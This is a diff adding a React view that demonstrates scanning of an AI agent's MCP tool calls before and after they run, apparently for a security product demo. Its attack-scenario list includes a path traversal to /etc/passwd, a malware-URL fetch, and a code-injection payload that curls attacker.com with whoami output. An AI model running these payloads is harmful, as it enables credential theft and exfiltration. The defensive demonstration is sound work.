@@ -1,0 +1,701 @@
+import React, { useState, useEffect, useRef } from 'react'
+import { motion, AnimatePresence } from 'framer-motion'
+import {
+  Network, Play, ShieldCheck, ShieldX, FileText, Globe,
+  Code2, Brain, ChevronRight, AlertTriangle, CheckCircle2,
+  Wifi, WifiOff, RefreshCw, Lock, Unlock, Terminal,
+  ArrowRight, Zap, Eye, Database,
+} from 'lucide-react'
+import { useProtectionTheme } from '../hooks/useProtectionTheme'
+import { useAppContext } from '../context/AppContext'
+
+// ── Tool definitions ───────────────────────────────────────────────────────────
+const TOOLS = [
+  {
+    id: 'read_file',
+    label: 'read_file',
+    icon: FileText,
+    color: '#60a5fa',
+    desc: 'Read a file from the sandboxed workspace',
+    params: [{ key: 'path', label: 'File path', placeholder: 'readme.txt', type: 'text' }],
+  },
+  {
+    id: 'web_fetch',
+    label: 'web_fetch',
+    icon: Globe,
+    color: '#34d399',
+    desc: 'Fetch a URL and return its content',
+    params: [{ key: 'url', label: 'URL', placeholder: 'https://example.com', type: 'text' }],
+  },
+  {
+    id: 'execute_code',
+    label: 'execute_code',
+    icon: Code2,
+    color: '#f97316',
+    desc: 'Execute Python code in a sandboxed subprocess',
+    params: [{ key: 'code', label: 'Python code', placeholder: 'print("hello")', type: 'textarea' }],
+  },
+  {
+    id: 'get_memory',
+    label: 'get_memory',
+    icon: Brain,
+    color: '#a78bfa',
+    desc: 'Retrieve a value from the agent memory store',
+    params: [{ key: 'key', label: 'Memory key', placeholder: 'session_id', type: 'text' }],
+  },
+  {
+    id: 'set_memory',
+    label: 'set_memory',
+    icon: Brain,
+    color: '#a78bfa',
+    desc: 'Store a value in the agent memory store',
+    params: [
+      { key: 'key', label: 'Key', placeholder: 'user_token', type: 'text' },
+      { key: 'value', label: 'Value', placeholder: 'abc123', type: 'text' },
+    ],
+  },
+]
+
+// ── Attack scenarios ───────────────────────────────────────────────────────────
+const SCENARIOS = [
+  {
+    id: 'path-traversal',
+    label: 'Path Traversal Attack',
+    desc: 'Agent tries to read /etc/passwd via directory traversal',
+    threat: 'Malicious Tool Invocation',
+    stage: 'Stage 1',
+    severity: 'critical',
+    tool: 'read_file',
+    params: { path: '../../etc/passwd' },
+    color: '#ef4444',
+  },
+  {
+    id: 'malicious-url',
+    label: 'Malicious URL Fetch',
+    desc: 'Agent fetches a known malicious domain for C2 callback',
+    threat: 'Malicious URL / C2',
+    stage: 'Stage 1',
+    severity: 'critical',
+    tool: 'web_fetch',
+    params: { url: 'http://malware.wicar.org/data/ms14_064_ole_not_xp.html' },
+    color: '#ef4444',
+  },
+  {
+    id: 'pii-exfiltration',
+    label: 'PII Data Exfiltration',
+    desc: 'Agent reads file containing SSNs and credit card numbers',
+    threat: 'Data Loss Prevention',
+    stage: 'Stage 2',
+    severity: 'high',
+    tool: 'read_file',
+    params: { path: 'data/users.csv' },
+    color: '#f97316',
+  },
+  {
+    id: 'secret-leak',
+    label: 'API Key Leak',
+    desc: 'Agent reads config file containing live API keys',
+    threat: 'Credential / Secret Leak',
+    stage: 'Stage 2',
+    severity: 'high',
+    tool: 'read_file',
+    params: { path: 'config.json' },
+    color: '#f97316',
+  },
+  {
+    id: 'code-injection',
+    label: 'Code Injection',
+    desc: 'Injected code attempts OS-level command execution',
+    threat: 'Malicious Code Execution',
+    stage: 'Stage 1',
+    severity: 'critical',
+    tool: 'execute_code',
+    params: { code: '__import__("os").system("cat /etc/passwd && curl http://attacker.com/exfil?d=$(whoami)")' },
+    color: '#ef4444',
+  },
+]
+
+// ── Helpers ────────────────────────────────────────────────────────────────────
+const SEV_COLORS = { critical: '#ef4444', high: '#f97316', medium: '#facc15', low: '#60a5fa' }
+
+function DetectionBadges({ detected = {} }) {
+  const flags = Object.entries(detected).filter(([, v]) => v === true).map(([k]) => k)
+  if (!flags.length) return null
+  return (
+    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginTop: 6 }}>
+      {flags.map(f => (
+        <span key={f} style={{
+          fontSize: 9, fontWeight: 700, padding: '2px 7px', borderRadius: 99,
+          background: 'rgba(239,68,68,0.15)', border: '1px solid rgba(239,68,68,0.35)',
+          color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.08em',
+        }}>{f.replace(/_/g, ' ')}</span>
+      ))}
+    </div>
+  )
+}
+
+function ScanStageCard({ stage, label, data, pending, skipped }) {
+  const isBlock = data?.action === 'block'
+  const isAllow = data?.action === 'allow'
+
+  const borderColor = pending ? 'rgba(255,255,255,0.08)'
+    : skipped ? 'rgba(255,255,255,0.05)'
+    : isBlock ? 'rgba(239,68,68,0.35)'
+    : isAllow ? 'rgba(52,211,153,0.35)'
+    : 'rgba(255,255,255,0.08)'
+
+  const bgColor = pending ? 'rgba(255,255,255,0.02)'
+    : skipped ? 'rgba(255,255,255,0.01)'
+    : isBlock ? 'rgba(239,68,68,0.06)'
+    : isAllow ? 'rgba(52,211,153,0.06)'
+    : 'rgba(255,255,255,0.02)'
+
+  return (
+    <div style={{ border: `1px solid ${borderColor}`, background: bgColor, borderRadius: 12, padding: '12px 14px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
+        <span style={{ fontSize: 9, fontWeight: 700, color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.12em' }}>
+          {stage}
+        </span>
+        <span style={{ fontSize: 10, color: '#94a3b8', flex: 1 }}>{label}</span>
+        {pending && <RefreshCw size={11} color="#64748b" className="animate-spin" />}
+        {skipped && <span style={{ fontSize: 9, color: '#64748b' }}>skipped</span>}
+        {isBlock && <ShieldX size={14} color="#ef4444" />}
+        {isAllow && <ShieldCheck size={14} color="#34d399" />}
+      </div>
+      {data && (
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
+          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
+            <span style={{
+              fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 6,
+              background: isBlock ? 'rgba(239,68,68,0.18)' : 'rgba(52,211,153,0.18)',
+              color: isBlock ? '#ef4444' : '#34d399',
+            }}>
+              {data.action?.toUpperCase()}
+            </span>
+            {data.category && (
+              <span style={{ fontSize: 10, color: '#64748b' }}>{data.category}</span>
+            )}
+            {data.latencyMs && (
+              <span style={{ fontSize: 9, color: '#64748b', marginLeft: 'auto' }}>{data.latencyMs}ms</span>
+            )}
+          </div>
+          <DetectionBadges detected={data.prompt_detected || data.response_detected} />
+          {data.scan_id && (
+            <span style={{ fontSize: 9, fontFamily: 'monospace', color: '#475569', marginTop: 2 }}>
+              scan_id: {data.scan_id}
+            </span>
+          )}
+        </div>
+      )}
+    </div>
+  )
+}
+
+// ── Main view ──────────────────────────────────────────────────────────────────
+export function McpSecurityView() {
+  const theme = useProtectionTheme()
+  const { state } = useAppContext()
+  const isProtected = state.isProtected
+
+  const [mcpHealth, setMcpHealth] = useState(null)
+  const [selectedTool, setSelectedTool] = useState(TOOLS[0])
+  const [params, setParams] = useState({ path: 'readme.txt' })
+  const [invoking, setInvoking] = useState(false)
+  const [result, setResult] = useState(null)
+  const [log, setLog] = useState([])
+  const logEndRef = useRef(null)
+
+  // Health check
+  useEffect(() => {
+    const check = () => fetch('/api/mcp/health').then(r => r.json()).then(d => setMcpHealth(d.running)).catch(() => setMcpHealth(false))
+    check()
+    const t = setInterval(check, 10000)
+    return () => clearInterval(t)
+  }, [])
+
+  useEffect(() => {
+    logEndRef.current?.scrollIntoView({ behavior: 'smooth' })
+  }, [log])
+
+  const invoke = async (tool, paramValues) => {
+    setInvoking(true)
+    setResult(null)
+
+    const entry = {
+      id: Date.now(),
+      tool,
+      params: paramValues,
+      airsEnabled: isProtected,
+      ts: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
+      result: null,
+    }
+
+    try {
+      const res = await fetch('/api/mcp/invoke', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tool, params: paramValues, airsEnabled: isProtected }),
+      })
+      const data = await res.json()
+      entry.result = data
+      setResult(data)
+    } catch (err) {
+      entry.result = { error: err.message }
+      setResult({ error: err.message })
+    }
+
+    setLog(l => [entry, ...l].slice(0, 20))
+    setInvoking(false)
+  }
+
+  const handleInvoke = () => invoke(selectedTool.id, params)
+
+  const handleScenario = (scenario) => {
+    const tool = TOOLS.find(t => t.id === scenario.tool)
+    if (tool) {
+      setSelectedTool(tool)
+      setParams(scenario.params)
+    }
+    invoke(scenario.tool, scenario.params)
+  }
+
+  const handleToolChange = (tool) => {
+    setSelectedTool(tool)
+    const defaults = {}
+    tool.params.forEach(p => { defaults[p.key] = '' })
+    setParams(defaults)
+    setResult(null)
+  }
+
+  const isLight = document.documentElement.classList.contains('light')
+  const cardBg = isLight ? '#ffffff' : 'rgba(255,255,255,0.02)'
+  const cardBorder = isLight ? 'rgba(0,48,135,0.10)' : 'rgba(255,255,255,0.08)'
+  const textPrimary = isLight ? '#0f172a' : '#e2e8f0'
+  const textMuted = '#64748b'
+  const panelBg = isLight ? '#f8fafc' : 'rgba(255,255,255,0.01)'
+
+  return (
+    <div style={{ display: 'flex', height: '100%', overflow: 'hidden' }}>
+
+      {/* ── LEFT: Tool panel ────────────────────────────────────────────────── */}
+      <div style={{
+        width: 300, flexShrink: 0, borderRight: `1px solid ${cardBorder}`,
+        display: 'flex', flexDirection: 'column', overflow: 'hidden', background: panelBg,
+      }}>
+        {/* Header */}
+        <div style={{
+          display: 'flex', alignItems: 'center', gap: 8,
+          padding: '12px 16px', borderBottom: `1px solid ${cardBorder}`, flexShrink: 0,
+        }}>
+          <Network size={14} color={theme.isProtected ? '#34d399' : '#f87171'} />
+          <span style={{ fontSize: 12, fontWeight: 600, color: textPrimary }}>MCP Tool Invoker</span>
+          <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 6 }}>
+            {/* Protection indicator */}
+            <div style={{
+              display: 'flex', alignItems: 'center', gap: 4,
+              padding: '2px 8px', borderRadius: 99, fontSize: 9, fontWeight: 700,
+              background: isProtected ? 'rgba(52,211,153,0.12)' : 'rgba(239,68,68,0.12)',
+              border: `1px solid ${isProtected ? 'rgba(52,211,153,0.30)' : 'rgba(239,68,68,0.30)'}`,
+              color: isProtected ? '#34d399' : '#ef4444',
+            }}>
+              {isProtected ? <Lock size={8} /> : <Unlock size={8} />}
+              {isProtected ? 'AIRS ON' : 'AIRS OFF'}
+            </div>
+            {/* MCP server health */}
+            <div style={{
+              display: 'flex', alignItems: 'center', gap: 4,
+              padding: '2px 7px', borderRadius: 99, fontSize: 9, fontWeight: 700,
+              background: mcpHealth === null ? 'rgba(100,116,139,0.12)' : mcpHealth ? 'rgba(52,211,153,0.12)' : 'rgba(239,68,68,0.12)',
+              border: `1px solid ${mcpHealth === null ? 'rgba(100,116,139,0.25)' : mcpHealth ? 'rgba(52,211,153,0.30)' : 'rgba(239,68,68,0.30)'}`,
+              color: mcpHealth === null ? '#64748b' : mcpHealth ? '#34d399' : '#ef4444',
+            }}>
+              {mcpHealth === null ? <RefreshCw size={8} className="animate-spin" /> : mcpHealth ? <Wifi size={8} /> : <WifiOff size={8} />}
+              {mcpHealth === null ? 'checking' : mcpHealth ? 'live' : 'offline'}
+            </div>
+          </div>
+        </div>
+
+        <div style={{ flex: 1, overflowY: 'auto', padding: '14px 14px' }}>
+
+          {/* Attack Scenarios */}
+          <div style={{ marginBottom: 18 }}>
+            <div style={{ fontSize: 9, fontWeight: 700, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.12em', marginBottom: 8 }}>
+              Attack Scenarios
+            </div>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 5 }}>
+              {SCENARIOS.map(s => (
+                <button
+                  key={s.id}
+                  onClick={() => handleScenario(s)}
+                  disabled={invoking || mcpHealth === false}
+                  style={{
+                    display: 'flex', alignItems: 'flex-start', gap: 10,
+                    padding: '8px 10px', borderRadius: 10, cursor: 'pointer', textAlign: 'left', width: '100%',
+                    background: isLight ? 'rgba(0,0,0,0.02)' : 'rgba(255,255,255,0.02)',
+                    border: `1px solid ${isLight ? 'rgba(0,0,0,0.06)' : 'rgba(255,255,255,0.07)'}`,
+                    opacity: (invoking || mcpHealth === false) ? 0.5 : 1,
+                    transition: 'all 0.15s',
+                  }}
+                  onMouseEnter={e => { e.currentTarget.style.borderColor = s.color + '50'; e.currentTarget.style.background = s.color + '10' }}
+                  onMouseLeave={e => { e.currentTarget.style.borderColor = isLight ? 'rgba(0,0,0,0.06)' : 'rgba(255,255,255,0.07)'; e.currentTarget.style.background = isLight ? 'rgba(0,0,0,0.02)' : 'rgba(255,255,255,0.02)' }}
+                >
+                  <div style={{ width: 5, height: 5, borderRadius: '50%', background: s.color, flexShrink: 0, marginTop: 5 }} />
+                  <div style={{ flex: 1, minWidth: 0 }}>
+                    <div style={{ fontSize: 11, fontWeight: 600, color: textPrimary }}>{s.label}</div>
+                    <div style={{ fontSize: 10, color: textMuted, marginTop: 1, lineHeight: 1.4 }}>{s.desc}</div>
+                    <div style={{ display: 'flex', gap: 5, marginTop: 4 }}>
+                      <span style={{ fontSize: 8, fontWeight: 700, color: s.color, background: s.color + '18', padding: '1px 5px', borderRadius: 4 }}>{s.stage}</span>
+                      <span style={{ fontSize: 8, color: textMuted }}>{s.threat}</span>
+                    </div>
+                  </div>
+                </button>
+              ))}
+            </div>
+          </div>
+
+          {/* Divider */}
+          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
+            <div style={{ flex: 1, height: 1, background: cardBorder }} />
+            <span style={{ fontSize: 9, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.08em' }}>or custom</span>
+            <div style={{ flex: 1, height: 1, background: cardBorder }} />
+          </div>
+
+          {/* Tool selector */}
+          <div style={{ marginBottom: 12 }}>
+            <div style={{ fontSize: 9, fontWeight: 700, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.12em', marginBottom: 7 }}>
+              Select Tool
+            </div>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
+              {TOOLS.map(t => (
+                <button
+                  key={t.id}
+                  onClick={() => handleToolChange(t)}
+                  style={{
+                    display: 'flex', alignItems: 'center', gap: 8,
+                    padding: '6px 10px', borderRadius: 8, cursor: 'pointer', textAlign: 'left', width: '100%',
+                    background: selectedTool.id === t.id ? t.color + '18' : 'transparent',
+                    border: `1px solid ${selectedTool.id === t.id ? t.color + '40' : 'transparent'}`,
+                    transition: 'all 0.12s',
+                  }}
+                >
+                  <t.icon size={12} color={selectedTool.id === t.id ? t.color : textMuted} />
+                  <span style={{ fontSize: 11, fontFamily: 'monospace', color: selectedTool.id === t.id ? t.color : textMuted, fontWeight: selectedTool.id === t.id ? 600 : 400 }}>
+                    {t.label}
+                  </span>
+                </button>
+              ))}
+            </div>
+          </div>
+
+          {/* Params */}
+          <div style={{ marginBottom: 14 }}>
+            <div style={{ fontSize: 9, fontWeight: 700, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.12em', marginBottom: 7 }}>
+              Parameters
+            </div>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+              {selectedTool.params.map(p => (
+                <div key={p.key}>
+                  <label style={{ fontSize: 10, color: textMuted, display: 'block', marginBottom: 4 }}>{p.label}</label>
+                  {p.type === 'textarea' ? (
+                    <textarea
+                      value={params[p.key] ?? ''}
+                      onChange={e => setParams(prev => ({ ...prev, [p.key]: e.target.value }))}
+                      placeholder={p.placeholder}
+                      rows={3}
+                      style={{
+                        width: '100%', background: isLight ? '#f1f5f9' : 'rgba(0,0,0,0.3)',
+                        border: `1px solid ${cardBorder}`, borderRadius: 8,
+                        padding: '6px 10px', fontSize: 11, fontFamily: 'monospace',
+                        color: textPrimary, resize: 'vertical', outline: 'none',
+                        boxSizing: 'border-box',
+                      }}
+                    />
+                  ) : (
+                    <input
+                      value={params[p.key] ?? ''}
+                      onChange={e => setParams(prev => ({ ...prev, [p.key]: e.target.value }))}
+                      placeholder={p.placeholder}
+                      style={{
+                        width: '100%', background: isLight ? '#f1f5f9' : 'rgba(0,0,0,0.3)',
+                        border: `1px solid ${cardBorder}`, borderRadius: 8,
+                        padding: '6px 10px', fontSize: 11, fontFamily: 'monospace',
+                        color: textPrimary, outline: 'none', boxSizing: 'border-box',
+                      }}
+                    />
+                  )}
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Invoke button */}
+          <motion.button
+            onClick={handleInvoke}
+            disabled={invoking || mcpHealth === false}
+            whileTap={{ scale: 0.97 }}
+            style={{
+              width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6,
+              padding: '10px 0', borderRadius: 10, fontWeight: 700, fontSize: 13, cursor: 'pointer',
+              background: invoking || mcpHealth === false ? 'rgba(100,116,139,0.15)' : selectedTool.color,
+              color: invoking || mcpHealth === false ? '#64748b' : '#ffffff',
+              border: 'none', transition: 'all 0.15s',
+            }}
+          >
+            {invoking ? <><RefreshCw size={13} className="animate-spin" /> Invoking…</> : <><Play size={13} /> Invoke Tool</>}
+          </motion.button>
+
+          {mcpHealth === false && (
+            <div style={{ marginTop: 10, padding: '8px 10px', borderRadius: 8, background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.20)' }}>
+              <p style={{ fontSize: 10, color: '#ef4444', margin: 0 }}>MCP server offline. Run <code style={{ fontFamily: 'monospace' }}>bash setup-mcp.sh</code> then restart.</p>
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* ── CENTER: Pipeline + result ─────────────────────────────────────────── */}
+      <div style={{ flex: 1, minWidth: 0, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
+
+        {/* Pipeline header */}
+        <div style={{
+          padding: '14px 20px', borderBottom: `1px solid ${cardBorder}`, flexShrink: 0,
+          display: 'flex', alignItems: 'center', gap: 8,
+        }}>
+          <span style={{ fontSize: 10, fontWeight: 700, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.12em' }}>
+            MCP Security Pipeline
+          </span>
+          <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
+            {[
+              { label: 'Agent', icon: Terminal, color: '#94a3b8' },
+              null,
+              { label: 'AIRS Stage 1', icon: ShieldCheck, color: isProtected ? '#34d399' : '#ef4444', sub: 'Pre-Tool Scan' },
+              null,
+              { label: 'MCP Tool', icon: Network, color: selectedTool.color },
+              null,
+              { label: 'AIRS Stage 2', icon: ShieldCheck, color: isProtected ? '#34d399' : '#ef4444', sub: 'Post-Tool Scan' },
+              null,
+              { label: 'Response', icon: CheckCircle2, color: '#94a3b8' },
+            ].map((node, i) => node === null ? (
+              <ArrowRight key={i} size={12} color={isProtected ? '#34d399' : '#94a3b8'} style={{ opacity: 0.4 }} />
+            ) : (
+              <div key={i} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2 }}>
+                <div style={{
+                  width: 28, height: 28, borderRadius: 8,
+                  background: node.color + '18', border: `1px solid ${node.color}35`,
+                  display: 'flex', alignItems: 'center', justifyContent: 'center',
+                }}>
+                  <node.icon size={12} color={node.color} />
+                </div>
+                <span style={{ fontSize: 8, color: node.color, fontWeight: 600, textAlign: 'center', maxWidth: 56, lineHeight: 1.2 }}>{node.label}</span>
+                {node.sub && <span style={{ fontSize: 7, color: textMuted, textAlign: 'center' }}>{node.sub}</span>}
+              </div>
+            ))}
+          </div>
+          {!isProtected && (
+            <span style={{ fontSize: 9, color: '#ef4444', fontWeight: 600 }}>AIRS scanning disabled — toggle protection ON</span>
+          )}
+        </div>
+
+        {/* Result area */}
+        <div style={{ flex: 1, overflowY: 'auto', padding: '16px 20px', display: 'flex', flexDirection: 'column', gap: 14 }}>
+
+          <AnimatePresence mode="wait">
+            {!result && !invoking && (
+              <motion.div
+                key="empty"
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                exit={{ opacity: 0 }}
+                style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 12, textAlign: 'center', padding: 40 }}
+              >
+                <Network size={40} color="#1e293b" />
+                <div>
+                  <p style={{ fontSize: 14, fontWeight: 600, color: '#334155', margin: 0 }}>Select an attack scenario or invoke a tool</p>
+                  <p style={{ fontSize: 12, color: textMuted, marginTop: 4 }}>
+                    {isProtected ? 'AIRS will scan both the tool invocation and its output' : 'Toggle protection ON to enable AIRS scanning'}
+                  </p>
+                </div>
+              </motion.div>
+            )}
+
+            {invoking && (
+              <motion.div
+                key="loading"
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                exit={{ opacity: 0 }}
+                style={{ display: 'flex', flexDirection: 'column', gap: 10 }}
+              >
+                <ScanStageCard stage="Stage 1" label="Pre-Tool AIRS Scan" pending={isProtected} skipped={!isProtected} data={null} />
+                <ScanStageCard stage="Tool" label="Executing MCP tool…" pending={true} data={null} />
+                <ScanStageCard stage="Stage 2" label="Post-Tool AIRS Scan" pending={false} skipped={true} data={null} />
+              </motion.div>
+            )}
+
+            {result && !invoking && (
+              <motion.div
+                key="result"
+                initial={{ opacity: 0, y: 8 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0 }}
+                style={{ display: 'flex', flexDirection: 'column', gap: 10 }}
+              >
+                {/* Overall verdict banner */}
+                <div style={{
+                  padding: '12px 16px', borderRadius: 12,
+                  background: result.blocked ? 'rgba(239,68,68,0.08)' : result.error ? 'rgba(250,204,21,0.08)' : 'rgba(52,211,153,0.08)',
+                  border: `1px solid ${result.blocked ? 'rgba(239,68,68,0.30)' : result.error ? 'rgba(250,204,21,0.30)' : 'rgba(52,211,153,0.30)'}`,
+                  display: 'flex', alignItems: 'center', gap: 10,
+                }}>
+                  {result.blocked ? <ShieldX size={20} color="#ef4444" /> : result.error ? <AlertTriangle size={20} color="#facc15" /> : <ShieldCheck size={20} color="#34d399" />}
+                  <div>
+                    <div style={{ fontSize: 13, fontWeight: 700, color: result.blocked ? '#ef4444' : result.error ? '#facc15' : '#34d399' }}>
+                      {result.blocked ? `🚫 Blocked at ${result.blockStage === 1 ? 'Stage 1 — Tool invocation prevented' : 'Stage 2 — Response suppressed'}` : result.error ? `⚠️ Tool Error` : '✅ Allowed — Tool executed successfully'}
+                    </div>
+                    <div style={{ fontSize: 11, color: textMuted, marginTop: 2 }}>
+                      {result.blocked
+                        ? `AIRS detected a threat in the ${result.blockStage === 1 ? 'tool invocation parameters' : 'tool output'}`
+                        : result.error ? result.error
+                        : `Tool: ${result.tool} · AIRS scans: ${isProtected ? 'enabled' : 'disabled'}`}
+                    </div>
+                  </div>
+                </div>
+
+                {/* Stage 1 */}
+                <ScanStageCard
+                  stage="Stage 1 — Pre-Tool"
+                  label="AIRS scans tool name + parameters before execution"
+                  data={result.stage1}
+                  pending={false}
+                  skipped={!isProtected}
+                />
+
+                {/* Tool result */}
+                {!result.blocked && !result.error && result.toolResult && (
+                  <div style={{ border: `1px solid ${cardBorder}`, background: cardBg, borderRadius: 12, padding: '12px 14px' }}>
+                    <div style={{ fontSize: 9, fontWeight: 700, color: textMuted, textTransform: 'uppercase', letterSpacing: '0.12em', marginBottom: 8 }}>
+                      Tool Output — {result.tool}
+                    </div>
+                    <pre style={{
+                      fontSize: 10, fontFamily: 'monospace', color: '#94a3b8',
+                      whiteSpace: 'pre-wrap', wordBreak: 'break-all', margin: 0,
+                      maxHeight: 200, overflowY: 'auto',
+                      background: isLight ? '#f1f5f9' : 'rgba(0,0,0,0.25)',
+                      padding: '8px 10px', borderRadius: 8,
+                    }}>
+                      {JSON.stringify(result.toolResult, null, 2)}
+                    </pre>
+                  </div>
+                )}
+
+                {/* Stage 2 */}
+                <ScanStageCard
+                  stage="Stage 2 — Post-Tool"
+                  label="AIRS scans tool output before returning to agent"
+                  data={result.stage2}
+                  pending={false}
+                  skipped={!isProtected || result.blockStage === 1}
+                />
+
+                {/* Raw request bodies */}
+                {isProtected && (result.stage1 || result.stage2) && (
+                  <details style={{ marginTop: 4 }}>
+                    <summary style={{ fontSize: 10, color: textMuted, cursor: 'pointer', userSelect: 'none' }}>
+                      Show AIRS request payloads
+                    </summary>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginTop: 8 }}>
+                      {result.stage1?.requestBody && (
+                        <div>
+                          <div style={{ fontSize: 9, color: textMuted, marginBottom: 4 }}>Stage 1 request body:</div>
+                          <pre style={{ fontSize: 9, fontFamily: 'monospace', color: '#64748b', background: isLight ? '#f1f5f9' : 'rgba(0,0,0,0.25)', padding: '8px 10px', borderRadius: 8, margin: 0, overflowX: 'auto', whiteSpace: 'pre-wrap' }}>
+                            {JSON.stringify(result.stage1.requestBody, null, 2)}
+                          </pre>
+                        </div>
+                      )}
+                      {result.stage2?.requestBody && (
+                        <div>
+                          <div style={{ fontSize: 9, color: textMuted, marginBottom: 4 }}>Stage 2 request body:</div>
+                          <pre style={{ fontSize: 9, fontFamily: 'monospace', color: '#64748b', background: isLight ? '#f1f5f9' : 'rgba(0,0,0,0.25)', padding: '8px 10px', borderRadius: 8, margin: 0, overflowX: 'auto', whiteSpace: 'pre-wrap' }}>
+                            {JSON.stringify(result.stage2.requestBody, null, 2)}
+                          </pre>
+                        </div>
+                      )}
+                    </div>
+                  </details>
+                )}
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+      </div>
+
+      {/* ── RIGHT: Invocation log ─────────────────────────────────────────────── */}
+      <div style={{
+        width: 280, flexShrink: 0, borderLeft: `1px solid ${cardBorder}`,
+        display: 'flex', flexDirection: 'column', overflow: 'hidden', background: panelBg,
+      }}>
+        <div style={{ padding: '12px 14px', borderBottom: `1px solid ${cardBorder}`, flexShrink: 0 }}>
+          <span style={{ fontSize: 11, fontWeight: 600, color: textPrimary }}>Invocation Log</span>
+          {log.length > 0 && (
+            <button onClick={() => setLog([])} style={{ float: 'right', fontSize: 9, color: textMuted, background: 'none', border: 'none', cursor: 'pointer' }}>
+              Clear
+            </button>
+          )}
+        </div>
+
+        <div style={{ flex: 1, overflowY: 'auto', padding: '10px 10px' }}>
+          {log.length === 0 ? (
+            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 8, textAlign: 'center', padding: '0 20px' }}>
+              <Terminal size={24} color="#1e293b" />
+              <p style={{ fontSize: 11, color: textMuted, margin: 0 }}>Invocations will appear here</p>
+            </div>
+          ) : (
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
+              {log.map(entry => {
+                const r = entry.result
+                const blocked = r?.blocked
+                const hasError = r?.error
+                return (
+                  <motion.div
+                    key={entry.id}
+                    initial={{ opacity: 0, x: 10 }}
+                    animate={{ opacity: 1, x: 0 }}
+                    style={{
+                      padding: '8px 10px', borderRadius: 10, cursor: 'pointer',
+                      border: `1px solid ${blocked ? 'rgba(239,68,68,0.25)' : hasError ? 'rgba(250,204,21,0.20)' : cardBorder}`,
+                      background: blocked ? 'rgba(239,68,68,0.05)' : hasError ? 'rgba(250,204,21,0.05)' : cardBg,
+                    }}
+                    onClick={() => r && setResult(r)}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                      {blocked ? <ShieldX size={11} color="#ef4444" /> : hasError ? <AlertTriangle size={11} color="#facc15" /> : <ShieldCheck size={11} color="#34d399" />}
+                      <span style={{ fontSize: 10, fontFamily: 'monospace', fontWeight: 600, color: textPrimary, flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                        {entry.tool}
+                      </span>
+                      <span style={{ fontSize: 8, color: textMuted }}>{entry.ts}</span>
+                    </div>
+                    <div style={{ fontSize: 9, color: textMuted, marginTop: 3, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                      {JSON.stringify(entry.params)}
+                    </div>
+                    {r && (
+                      <div style={{ display: 'flex', gap: 4, marginTop: 4 }}>
+                        {r.airsEnabled && <span style={{ fontSize: 8, color: '#34d399', background: 'rgba(52,211,153,0.10)', padding: '1px 5px', borderRadius: 4 }}>AIRS</span>}
+                        <span style={{
+                          fontSize: 8, fontWeight: 700, padding: '1px 5px', borderRadius: 4,
+                          color: blocked ? '#ef4444' : hasError ? '#facc15' : '#34d399',
+                          background: blocked ? 'rgba(239,68,68,0.12)' : hasError ? 'rgba(250,204,21,0.12)' : 'rgba(52,211,153,0.12)',
+                        }}>
+                          {blocked ? `BLOCKED S${r.blockStage}` : hasError ? 'ERROR' : 'ALLOWED'}
+                        </span>
+                      </div>
+                    )}
+                  </motion.div>
+                )
+              })}
+              <div ref={logEndRef} />
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  )
+}
